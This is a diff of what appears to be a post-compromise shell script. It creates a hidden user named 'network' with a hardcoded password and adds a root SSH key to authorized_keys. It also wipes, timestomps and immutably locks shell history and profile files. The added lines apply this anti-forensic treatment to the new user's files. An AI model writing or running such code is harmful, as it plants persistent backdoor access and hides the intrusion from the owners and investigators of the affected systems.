@@ -101,6 +101,9 @@ find ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local
 chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
 
 sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
+truncate -s 0 /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history
+find /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history -exec touch -r /usr/games {} \;
+chattr +i /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
 cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
 find /root/.ssh -exec touch -r /usr/games {} \;
